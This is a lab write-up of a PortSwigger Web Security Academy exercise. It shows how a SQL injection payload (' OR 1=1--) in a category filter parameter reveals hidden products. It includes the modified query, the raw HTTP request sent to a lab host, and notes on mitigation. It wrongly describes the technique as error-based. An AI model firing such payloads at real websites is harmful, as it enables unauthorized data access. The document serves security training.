**Web Security Academy Lab Completion Report**

**Lab: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data**


This report details my approach to completing the SQL injection vulnerability lab that involves manipulating a SQL query in the product category filter to reveal hidden products.

---

**Lab Objective:**  
This lab contains a SQL injection vulnerability in the product category filter. The application executes the following SQL query when a user selects a category:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

The goal is to modify this query to bypass the filter and retrieve unreleased products.

---

**Solution Approach:**  
To successfully exploit the SQL injection vulnerability, the following steps were taken:

1. **Intercepting the Request:**  
   - Used Burp Suite to capture and analyze the request made when selecting a product category.

2. **Identifying the Injection Point:**  
   - The vulnerable parameter was identified as `category` in the GET request.

3. **Constructing the SQL Injection Payload:**  
   - By appending `'+OR+1=1--` to the `category` parameter, we altered the SQL query as follows:

   ```sql
   SELECT * FROM products WHERE category = 'Corporate gifts' OR 1=1-- AND released = 1;
   ```

   - The `OR 1=1` condition always evaluates to true, effectively bypassing the `released = 1` restriction.

4. **Modifying and Submitting the Request:**  
   - Sent the modified request using Burp Suite:

   ```http
   GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2
   Host: 0a0800700462cb7581432f3f0036004d.web-security-academy.net
   ````

5. **Verifying the Exploit:**  
   - The response displayed previously hidden products, confirming successful SQL injection.

---

**Key Takeaways:**  
- **Input validation and sanitization are critical.** Properly escaping user input and using prepared statements can prevent SQL injection attacks.
- **Blind SQL injection scenarios should also be tested.** This lab focused on an error-based approach, but other methods exist.
- **Web applications should employ least privilege access control.** The database should minimize access to sensitive data based on user roles.

---

**Conclusion:**  
Successfully completing this lab reinforced my understanding of SQL injection vulnerabilities and mitigation strategies. This knowledge will be instrumental in future penetration testing and security research engagements.

---

**Next Steps:**  
- Continue progressing through the remaining SQL injection labs.
- Explore advanced SQL injection techniques, including blind and time-based attacks.
- Apply these concepts in practical bug bounty programs and real-world penetration testing scenarios.

![Server-Side Vulnerabilities- SQL Injection Lab1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/sqlinjection.PNG)

